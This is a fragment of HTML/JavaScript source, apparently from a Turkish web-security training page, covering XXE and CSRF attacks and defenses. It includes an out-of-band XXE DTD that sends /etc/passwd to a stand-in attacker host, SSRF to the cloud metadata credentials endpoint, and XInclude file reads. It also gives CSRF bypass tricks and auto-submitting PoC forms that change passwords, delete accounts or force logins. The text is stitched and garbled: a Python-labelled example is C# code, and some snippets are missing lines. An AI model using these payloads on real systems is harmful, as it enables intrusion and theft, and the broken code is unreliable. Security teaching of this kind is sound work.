        <p class="small" style="margin-bottom:5px;">saldirgan.com üzerinde host edilen evil.dtd dosyası, hedef dosyayı okuyup kendi sunucusuna HTTP isteği olarak gönderecek şekilde tanımlanır.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">-- http://saldirgan.com/evil.dtd:
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://saldirgan.com/?data=%file;'&gt;"&gt;

&lt;!DOCTYPE message [

        <p class="small" style="margin-bottom:5px;">Hedef sunucu payload'ı işlerken saldırganın sunucusuna otomatik olarak bir istek atar; dosya içeriği bu isteğin parametresinde taşınır.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">saldirgan.com access.log:
GET /?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1... HTTP/1.1</pre>
        <span class="small" style="color:#64748b;">Not: HTTP GET parametreleri newline (%0A) taşıyamadığından, çok satırlı dosyalar için genellikle base64 encode edilerek sızdırılır: <code>php://filter/convert.base64-encode/resource=...</code></span>
      </li>
    </ul>
    </div>
    </details>
  `

{
  title: "3.4- XXE üzerinden SSRF",
  content: `
    <details>

    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">SYSTEM URI'sinde dosya yolu yerine bir URL verilirse, sunucu saldırganın istediği adrese bir istek gönderir. Bu, hedefin dahili ağını (internal network) taramak veya cloud metadata servislerine erişmek için kullanılabilir.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">

        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</pre>
        <span class="small" style="color:#ef4444;">AWS/Azure/GCP ortamlarında bu teknik, geçici IAM kimlik bilgilerinin sızdırılmasına ve bulut hesabının tamamen ele geçirilmesine yol açabilir.</span>
      </li>
    </ul>
    </div>
    </details>
  `
},

{
  title: "3.5- Diğer XXE Enjeksiyon Vektörleri",
  content: `
    <p class="small" style="margin-bottom:15px;">XXE yalnızca "çıplak" bir XML API endpoint'inde aranmaz. XML'i dahili olarak kullanan pek çok dosya formatı ve protokol de saldırı yüzeyine dahildir.</p>
    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);">Dosya Yükleme Özellikleri (DOCX / XLSX / PPTX / ODT):</strong>
        Office Open XML formatları (.docx, .xlsx, .pptx) aslında birer ZIP arşivi içindeki XML dosyalarıdır. Bir "profil fotoğrafı" veya "belge yükle" özelliği, arka planda bu dosyaları parse ediyorsa, içine gömülen bir XXE payload'ı tetiklenebilir.
      </li>
      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);">SVG Dosya Yükleme:</strong>
        SVG, XML tabanlı bir görsel formatıdır. "Avatar yükle" gibi özellikler SVG kabul ediyorsa ve sunucu tarafında render ediliyorsa, SVG içine gömülen DOCTYPE ile XXE tetiklenebilir.
      </li>
      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);">SOAP Web Servisleri:</strong>
        SOAP mesajları XML tabanlıdır; SOAP endpoint'leri klasik REST/JSON API'lere göre XXE'ye karşı daha sık savunmasız çıkar çünkü XML parsing genelde varsayılan (güvensiz) ayarlarla yapılır.
      </li>
      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);">Content-Type Değiştirme (Gizli XML Endpoint'leri):</strong>
        JSON bekleyen bir endpoint'e istek gönderilirken <code>Content-Type: text/xml</code> ve gövdeye eşdeğer bir XML payload'ı yazılarak, arka planda hâlâ XML destekleyen ama arayüzde gösterilmeyen parser'lar tespit edilebilir.
      </li>
      <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);">XInclude:</strong>
        Saldırgan tüm DOCTYPE'ı kontrol edemiyorsa (yalnızca bir alt-eleman kontrolü varsa) bile, XInclude ile harici içerik dahil edilebilir:
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
&lt;/foo&gt;</pre>
      </li>
    </ul>
  `
},

          {
  title: "4. Savunma Yaklaşımı (XXE Korunması)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">XXE'yi engellemenin <b>tek kesin ve %100 etkili yolu</b>, XML parser seviyesinde DTD işlemeyi ve harici entity çözümlemeyi tamamen devre dışı bırakmaktır.<br>Girdi doğrulama veya blacklist tabanlı filtreleme (ör. "DOCTYPE" kelimesini engelleme) yetersizdir ve atlatılabilir.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">1. DTD İŞLEMEYİ TAMAMEN KAPATMAK (Ana Savunma Hattı)</strong>

        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#ef4444;"><span style="color:#64748b;">// ❌ HATALI / VULNERABLE (Java - varsayılan DocumentBuilderFactory ayarları):</span>
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userSuppliedXml); // DOCTYPE ve external entity varsayılan olarak AÇIK</pre>

        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:8px 0 0 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ GÜVENLİ / SECURE (Java - DOCTYPE tamamen reddediliyor):</span>
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);</pre>

        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:8px 0 0 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ GÜVENLİ / SECURE (PHP - libxml):</span>

$dom->loadXML($userSuppliedXml, LIBXML_NONET);</pre>

        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:8px 0 0 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ GÜVENLİ / SECURE (Python - defusedxml, en basit ve önerilen çözüm):</span>

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">2. XML İŞLEYEN TÜM DOSYA FORMATLARINI KAPSAMA</strong>
        <p class="small" style="margin:0;">Savunma yalnızca "ana" API endpoint'inde değil, XML tabanlı her formatı işleyen her yerde uygulanmalıdır:</p>
        <ul style="margin:5px 0 0 20px;padding:0;list-style-type:disc;">
          <li>Dosya yükleme (upload) özellikleri: SVG, DOCX, XLSX, PPTX, ODT parse eden kütüphaneler</li>
          <li>SOAP/WebDAV/XML-RPC servisleri</li>
          <li>RSS/Atom feed okuyucular</li>
          <li>PDF üretici/parser kütüphaneleri (bazıları dahili olarak XML kullanır)</li>
        </ul>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">3. JSON'A GEÇİŞ (Mümkünse)</strong>
        <p class="small" style="margin:0;">Uygulama mimarisi izin veriyorsa, XML tabanlı veri değişimi yerine JSON kullanmak XXE saldırı yüzeyini kökten ortadan kaldırır - JSON'da DTD/entity kavramı yoktur.</p>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">4. EN AZ YETKİ PRENSİBİ (Defense in Depth)</strong>
        <p class="small" style="margin-bottom:5px;">DTD kapatma birincil savunma olsa da, olası bir bypass durumunda hasarı azaltmak için ek katmanlar uygulanmalıdır:</p>
        <ul style="margin:5px 0 0 20px;padding:0;list-style-type:disc;">
          <li>Uygulama servis hesabının dosya sistemi okuma izinleri en aza indirilmelidir (özellikle <code>/etc/passwd</code>, SSH key'ler, uygulama config dosyaları).</li>
          <li>Sunucunun giden (egress) ağ trafiği; dahili servislere ve cloud metadata endpoint'lerine (<code>169.254.169.254</code>) erişimi engelleyecek şekilde filtrelenmelidir (SSRF'i sınırlamak için).</li>
          <li>Parser'lar güncel tutulmalı; bilinen CVE'lere sahip eski XML kütüphaneleri kullanılmamalıdır.</li>
          <li>WAF, DOCTYPE/ENTITY anahtar kelimelerini içeren istekleri ek bir katman olarak loglayıp uyarabilir (tek başına yeterli değildir).</li>
        </ul>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">5. DÜZENLİ GÜVENLİK TESTİ</strong>
        <p class="small" style="margin:0;">Yeni eklenen her dosya yükleme veya XML kabul eden özellik, üretime çıkmadan önce mutlaka XXE testlerinden (Resource Inclusion, OOB, SSRF senaryoları) geçirilmelidir.</p>

          {

          {
            "title": "2. Token Bypass Yöntemleri",
            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Parametreyi Sil:</strong> <code>csrf_token</code> parametresini komple sil. Backend \"parametre yoksa kontrol etme\" mantığındaysa geçer.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Değeri Boşalt (Empty Value):</strong> Parametre kalsın (`csrf_token=`) ama değerini sil. Backend sadece \"parametre gönderilmiş mi\" diye bakıp, içinin dolu olup olmadığını kontrol etmeyi unutmuş olabilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Token Swap (Değiş Tokuş):</strong> Kendi hesabının geçerli tokenını al, kurbanın isteğine koy. Sunucu \"Token geçerli mi?\" diye bakar ama \"Token bu adama mı ait?\" diye bakmazsa zafiyet vardır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Double Submit Bypass:</strong> Aynı Token hem Cookie hem Body'de mi gidiyor? İkisini de <code>hacked</code> yapıp yolla. Sunucu sadece \"iki değer eşit mi\" diye bakıyorsa bypass edersin.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Format Kontrolü:</strong> Token çok mu kısa? Sadece sayı mı? MD5 mi? Tahmin edilebilir veya kırılabilecek gibiyse brute-force dene.</li>\n\t\t\t</ul>"
          },
          {
            "title": "3. Header ve Referer Kandırma",
            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Header'ı Sil:</strong> Referer/Origin headerlarını tamamen silip yolla. Bazı sistemler \"Header yoksa güvenlidir\" diyip geçirir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Regex Bypass:</strong> Sistem <code>hedef.com</code> var mı diye mi bakıyor? <code>hedef.com.hacker.com</code> veya <code>hacker.com/hedef.com</code> yaparak regex'i kandır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Null Byte (%00):</strong> Origin'in sonuna <code>%00</code> atıp regex kontrolünü orada kesmeyi dene. Eski sistemlerde iş yapar.</li>\n\t\t\t</ul>"
          },
          {
            "title": "4. API & JSON CSRF",
            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Content-Type Spoofing:</strong> API JSON (<code>application/json</code>) bekliyor. Sen HTML form ile <code>text/plain</code> yolla ama body JSON olsun. Backend header'a bakmadan parse ederse zaafiyet kanıtlanır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>CORS Hataları:</strong> API <code>Origin: null</code> kabul ediyor mu? İsteği <code>iframe sandbox</code> içinden atarak Origin'i null yap ve korumayı aş.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>XSS ile CSRF Zinciri:</strong> Token var ve geçemiyor musun? XSS bulduysan token'ı okut, JS ile (fetch) isteği yapıştır. XSS varsa CSRF koruması çöp olur.</li>\n\t\t\t</ul>"
          },
          {
            "title": "Örnek CSRF Senaryoları",
            "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Temel Token Eksikliği (POST)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, kritik bir POST isteğinde CSRF token kontrolü yapmıyor.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /user/change_email HTTP/1.1\nCookie: session=abc...\n\nemail=hacker@mail.com&csrf_token=XXX</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/user/change_email\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n      &lt;!-- Token KALDIRILDI --&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Token Kısıtlaması Yok</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, gönderilen tokenın oturum çerezi ile ilişkilendirilip ilişkilendirilmediğini (yani tokenın kurbana ait olup olmadığını) kontrol etmiyor.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi hesabına giriş yapar ve kendi <code>csrf_token</code> değerini kaydeder. (Örn: <code>hacker_token</code>)<br>2. Saldırgan, bu <code>hacker_token</code> değerini kurbanı hedef alan PoC formuna yerleştirir.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/change_pass\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"new_password\" value=\"hacked123\" /&gt;\n      &lt;!-- Token olarak saldırganın tokenı kullanılıyor --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Referer Başlık Kontrolü Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Referer</code> başlığında sadece ana domainin (<code>victim.com</code>) geçip geçmediğini kontrol ediyor, subdomainleri dikkate almıyor.<br><div style='margin-top:10px;'><strong>Saldırgan Yöntemi:</strong> <code>https://victim.com.hacker.com/exploit.html</code> veya <code>https://hacker.com/exploit.html?referrer=https://victim.com</code> gibi teknikler denenir.<br>Bu örnekte, <code>.victim.com</code> tekniğini kullanalım. Saldırgan, <code>victim.com</code> ile biten bir subdomain oluşturur: <code>https://hacker-site.victim.com/poc.html</code></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Adresi:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://hacker-site.victim.com/poc.html</pre><strong style='margin-top:10px;display:block;'>Sonuç:</strong><div style='margin-top:5px;'>Sunucu <code>Referer</code> başlığına bakar ve <code>hacker-site.victim.com</code> adresini <code>victim.com</code>'a ait olarak yanlış yorumlayabilir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Zafiyetli Metot Kullanımı (GET ile Hesap Silme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik bir 'state-changing' işlem (hesap silme) için <code>POST</code> yerine <code>GET</code> metodu kullanılıyor. Bu, bir <code>&lt;img&gt;</code> veya <code>&lt;a&gt;</code> etiketi ile sömürülebilir.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>GET /user/delete?id=123&confirm=true HTTP/1.1\nCookie: session=abc...</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (En Basit Yöntem):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/user/delete?id=123&confirm=true\" style=\"display:none\"&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Kurbanın tarayıcısı, resmi yüklemeye çalışırken oturum çerezlerini de göndererek hesap silme isteğini tetikler.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - JSON CSRF (text/plain Yöntemi)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> API, <code>application/json</code> yerine <code>text/plain</code> olarak gönderilen JSON verilerini kabul ediyor ve <code>X-Requested-With</code> kontrolü yok.<br><div style='margin-top:10px;'><strong>Orijinal İstek (JSON):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /api/settings HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"new_name\"}</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;form action=\"https://victim.com/api/settings\" method=\"POST\" enctype=\"text/plain\"&gt;\n  &lt;input type=\"hidden\" name='{\"username\":\"hacked\"}' value='\"}' /&gt;\n  &lt;!-- Tarayıcı payload'ı şu şekilde kodlar: {'username':'hacked'}='}' --&gt;\n&lt;/form&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucu eğer akıllıca ayrıştırma yapmazsa, form verisini, geçerli bir JSON payload'ı olarak yorumlayabilir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Double Submit Cookie CSRF Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Uygulama, isteğin gövdesindeki/başlığındaki token ile çerezdeki tokenı eşleştirir. Ancak tokenı tekrar oluşturma (set etme) fonksiyonu zafiyetlidir.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi CSRF tokenını çerez olarak kurbana enjekte eder (Örn: XSS, XSS olmayan bir domainde zafiyetli bir çerez koyma, vb.).<br>2. Saldırgan, bu enjekte ettiği token değerini (Örn: <code>hacker_cookie_token</code>) PoC formuna koyar.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;!-- Daha önce XSS ile 'csrf_token' çerezi enjekte edilmiş varsayılır --&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/update_info\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"data\" value=\"hacked_data\" /&gt;\n      &lt;!-- Formdaki token, çerezdeki enjekte edilen token ile eşleşir --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_cookie_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - Origin Kontrolü Bypass (Null Byte veya Port Kullanımı)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Origin</code> başlığını regex ile kontrol ederken sonundaki port numarasını veya dizenin sonunu tam olarak kontrol etmez.<br><div style='margin-top:10px;'><strong>Saldırı Yöntemleri:</strong><br>1. Port Bypass: Saldırgan, <code>https://victim.com:8080.hacker.com</code> gibi bir URL kullanır. (Çoğu tarayıcı <code>Origin</code>'i sadece <code>https://victim.com</code> olarak gönderir, ancak bazı sunucular yanlış kontrol edebilir.)<br>2. Boş Byte: <code>Referer</code> veya <code>Origin</code> başlığına Null Byte (<code>%00</code>) eklenerek regex kontrolünün yanlış sonuç vermesi sağlanır.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) İsteği (Boş Byte Örneği):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /admin/action HTTP/1.1\nOrigin: https://victim.com%00.hacker.com</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucunun regex'i <code>victim.com</code>'dan sonraki kısmı kontrol etmezse veya <code>%00</code>'da keserse bypass gerçekleşir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - Güvenli Olmayan HTML Tag'leri ile GET CSRF</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik işlem <code>GET</code> metoduyla yapılıyor ve <code>Referer</code>/<code>Origin</code> kontrolü yok. <br><div style='margin-top:10px;'><strong>PoC İçin Kullanılabilecek Diğer Tag'ler:</strong><br>1. &lt;script src='...'&gt;: (API'lerde, yanıt tipi JS ise ve side-effect yaratıyorsa kullanılır.)<br>2. &lt;link href='...'&gt;: (Bazı tarayıcılar tarafından prefetch/prerender amacıyla tetiklenebilir.)<br>3. &lt;iframe src='...'&gt;: (Eski tarayıcılarda veya özel konfigürasyonlarda tetiklenebilir.)</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (AJAX/Fetch Kullanımı):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n// API çerezleri ile kimlik doğrulaması yapıyorsa ve CORS yanlış ayarlanmışsa çalışır\nfetch('https://victim.com/api/delete_user?id=123', {\n  method: 'GET',\n  mode: 'cors',\n  credentials: 'include' \n});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Eğer API, CORS ayarlarını <code>Access-Control-Allow-Credentials: true</code> ve <code>Access-Control-Allow-Origin: *</code> olarak ayarlamışsa<br>(bkz: 4. Bölüm, CORS CSRF), bu senaryo, klasik CSRF korumalarını atlayarak doğrudan kurbanın oturumuyla XHR isteği gönderir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 9 - Login CSRF (Oturum Bindirme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> <code>/login</code> endpoint'inde CSRF koruması yoktur. Saldırgan, kurbanı <em>kendi (saldırganın)</em> hesabına giriş yapmaya zorlar.<br><div style='margin-top:10px;'><strong>Neden Tehlikeli?</strong><ul style='padding-left:20px;margin:5px 0;'><li>Kurban, siteye girdiğini sanır ama aslında saldırganın hesabındadır.</li><li>Kurbanın girdiği kredi kartı bilgileri, arama geçmişi veya yüklediği dosyalar saldırganın hesabına kaydedilir.</li></ul></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/login\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"user\" value=\"hacker\" /&gt;\n      &lt;input type=\"hidden\" name=\"pass\" value=\"hacker123\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 10 - Referer \"Fail Open\" (Meta Tag Trick)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sistem, Referer başlığı <em>varsa</em> domaini kontroll eder, ancak Referer başlığı <em>hiç yoksa</em> (null/empty) isteğe güvenip izin verir (Fail Open).<br><div style='margin-top:10px;'><strong>Saldırı Yöntemi:</strong> Saldırgan, PoC sayfasına bir <code>meta</code> etiketi ekleyerek tarayıcının Referer başlığı göndermesini engeller.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;head&gt;\n    &lt;!-- Bu meta tag, tarayıcının Referer başlığını silmesini sağlar --&gt;\n    &lt;meta name=\"referrer\" content=\"no-referrer\"&gt;\n  &lt;/head&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/delete_account\" method=\"POST\"&gt;\n      &lt;!-- Parametreler --&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre><strong style='margin-top:10px;display:block;'>Sonuç:</strong><div style='margin-top:5px;'>Sunucu \"Referer başlığı yok, demek ki güvenli (örneğin bookmark'tan gelmiş)\" diye düşünür ve saldırıyı kabul eder.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 11 - SameSite Strict Bypass (On-Site Redirect Gadget Zinciri)</summary><div style='margin-top:10px;'><strong>Önemli Ön Koşul:</strong> Hedef endpoint'te CSRF Token koruması olmaması ve sitede manipüle edilebilir bir JS yönlendirme (Open Redirect/Gadget) bulunması gerekir.<br><strong>Zafiyet Mantığı:</strong> Çerezler <code>SameSite=Strict</code> olsa bile, tarayıcılar 'Site İçi' (on-site) yönlendirmelerde bu kısıtlamayı uygulamaz. Saldırgan, kurbanı önce siteye çerezsiz gönderir, ardından sitenin kendi JS kodu kurbanı çerezli şekilde hedef endpoint'e yönlendirir.<br><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n  document.location = 